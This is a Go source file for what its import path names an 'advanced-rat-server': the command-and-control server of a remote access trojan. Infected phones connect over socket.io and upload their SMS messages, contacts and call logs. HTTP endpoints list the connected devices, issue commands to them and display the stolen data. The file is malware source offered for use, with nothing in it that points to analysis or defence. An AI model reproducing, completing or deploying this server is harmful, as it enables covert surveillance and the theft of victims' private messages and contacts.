package main

import (
	"fmt"
	//"github.com/go-chi/chi"
	//"github.com/go-chi/chi/middleware"
	"github.com/diptomondal007/advanced-rat-server/handlers"
	"log"
	"net/http"

	"github.com/googollee/go-socket.io"
)


//type sms struct {
//	PhoneNumber string `json:"phone-number"`
//	Message string `json:"message"`
//}
//
//type smsList struct {
//	deviceName string `json:"device_name"`
//	allSMS []sms `json:"all_sms"`
//}


var server socketio.Server

func main() {
	//Chi instance
	//r  := chi.NewRouter()
	//
	////Chi middleware
	//r.Use(middleware.Logger)
	//r.Use(middleware.Recoverer)

	server, err := socketio.NewServer(nil)
	if err != nil {
		log.Fatal(err)
	}
	server.OnConnect("/", func(s socketio.Conn) error {
		device := handlers.Device{
			ID:                  s.ID(),
			Conn:                s,
			DeviceDetails:       s.RemoteHeader().Get("User-Agent"),
			DeviceRemoteAddress: s.RemoteAddr().String(),
		}
		handlers.DeviceList = append(handlers.DeviceList, device)
		fmt.Println("connected:", s.RemoteHeader().Get("User-Agent"))
		return nil
	})
	server.OnEvent("/","sms", func(c  socketio.Conn,data interface{}) {
		handlers.MessageList = data
	})
	server.OnEvent("/","contacts", func(c  socketio.Conn,data interface{}) {
		handlers.ContactList = data
	})
	server.OnEvent("/","call-logs", func(c  socketio.Conn,data interface{}) {
		log.Println(data)
		handlers.CallLogs = data
	})
	server.OnError("/", func(s socketio.Conn, e error) {
		fmt.Println("meet error:", e)
	})
	server.OnDisconnect("/", func(s socketio.Conn, reason string) {
		fmt.Println(s.ID())
		fmt.Println("disconnected ", s.ID())
		fmt.Println("closed", reason)
	})

	go server.Serve()
	defer server.Close()
	http.Handle("/", server)
	http.HandleFunc("/all", handlers.DeviceHandler)
	http.HandleFunc("/command", handlers.CommandHandler)
	http.HandleFunc("/sms/list", handlers.SmsListView)
	http.HandleFunc("/contact/list", handlers.ContactListView)
	http.HandleFunc("/call/logs", handlers.CallLogsView)
	log.Println("Listening on 8000....")
	log.Fatal(http.ListenAndServe(":8000", nil))
}